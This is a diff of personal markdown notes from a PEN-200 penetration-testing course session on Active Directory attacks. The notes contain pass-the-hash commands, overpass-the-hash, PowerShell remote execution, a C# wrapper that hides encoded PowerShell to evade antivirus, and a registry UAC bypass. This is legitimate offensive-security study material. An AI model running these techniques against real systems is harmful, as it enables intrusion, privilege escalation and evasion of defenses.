@@ -6,19 +6,14 @@ original_link: https://cardboard-iguana.com/log/2022-09-02-offsec-live-pen-200.h
 author: 100007
 ---
 
-# OffSec Live: PEN-200
-
-**author:** Nathan Acks  
-**date:** 2022-09-02
-
 # Active Directory Enumeration & Exploitation, Part 4
 
 LM hashes aren’t used in WIndows anymore, and often empty or garbage values will work fine when passing a full NTLM hash (only the NT hash is important).
 
 ```
 proxychains python3 \
-/usr/share/doc/python3-impacket/examples/psexec.py \
--hashes ${LM_HASH}:${NT_HASH} ${USER}@${MACHINE}
+	/usr/share/doc/python3-impacket/examples/psexec.py \
+	-hashes ${LM_HASH}:${NT_HASH} ${USER}@${MACHINE}
 ```
 
 There’s a technique called “overpass the hash” that allows you to take advantage of accounts that are authorized to interact with services but _not_ machines on a domain. The idea behind overpass-the-hash is to request a ticket from the domain controller for one user but then use that as the authentication credentials for a different user when running a command. This allows you to be logged in as, say, a service account but then use the credentials for a domain admin to interact with the domain controller. Stealthy!
@@ -53,7 +48,7 @@ Many large companies will enable PowerShell Remoting on all machines in order to
 
 ```
 Invoke-Command -ComputerName $MACHINE `
- -ScriptBlock {$COMMANDS_TO_RUN}
+	-ScriptBlock {$COMMANDS_TO_RUN}
 ```
 
 Remoting can be used to create a reverse shell.
@@ -71,18 +66,18 @@ C# can be used to bypass AV (at least as of September 2022) - just create a C# w
 using System;
 namespace Game
 {
-public class Program
-{
-public static void Main() {
-System.Diagnostics.Process P = new System.Diagnostics.Process();
-System.Diagnostics.ProcessStartInfo SI = new System.Diagnostics.ProcessStartInfo();
-SI.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-SI.FileName = "powershell.exe";
-SI.Arguments = "-enc $BASE64_ENCODED_SCRIPT_TO_RUN";
-P.StartInfo = SI;
-P.Start();
-}
-}
+	public class Program
+	{
+		public static void Main() {
+			System.Diagnostics.Process P = new System.Diagnostics.Process();
+			System.Diagnostics.ProcessStartInfo SI = new System.Diagnostics.ProcessStartInfo();
+			SI.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+			SI.FileName = "powershell.exe";
+			SI.Arguments = "-enc $BASE64_ENCODED_SCRIPT_TO_RUN";
+			P.StartInfo = SI;
+			P.Start();
+		}
+	}
 }
 ```
 
@@ -93,18 +88,18 @@ $code = @"
 using System;
 namespace Game
 {
-public class Program
-{
-public static void Main() {
-System.Diagnostics.Process P = new System.Diagnostics.Process();
-System.Diagnostics.ProcessStartInfo SI = new System.Diagnostics.ProcessStartInfo();
-SI.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-SI.FileName = "powershell.exe";
-SI.Arguments = "-enc $BASE64_ENCODED_SCRIPT_TO_RUN";
-P.StartInfo = SI;
-P.Start();
-}
-}
+	public class Program
+	{
+		public static void Main() {
+			System.Diagnostics.Process P = new System.Diagnostics.Process();
+			System.Diagnostics.ProcessStartInfo SI = new System.Diagnostics.ProcessStartInfo();
+			SI.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+			SI.FileName = "powershell.exe";
+			SI.Arguments = "-enc $BASE64_ENCODED_SCRIPT_TO_RUN";
+			P.StartInfo = SI;
+			P.Start();
+		}
+	}
 }
 "@
 Add-Type -outputtype consoleapplication -outputassembly $BINARY_NAME -TypeDefinition $code -Language CSharp
@@ -122,10 +117,11 @@ Note that if you try to put powershell.exe into this, Defender will block the sh
 ```
 New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
 Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" `
- -Name "(default)" -Value "cmd.exe /c start powershell.exe" -Force
+	-Name "(default)" -Value "cmd.exe /c start powershell.exe" -Force
+
 New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
 Set-ItemProperty "HKCU:\Software\Classes\ms-settings\CurVer" `
- -Name "(default)" -value ".pwn" -Force
+	-Name "(default)" -value ".pwn" -Force
 ```
 
 - [Utilizing Programmatic Identifiers (ProgIDs) for UAC Bypasses](https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses)
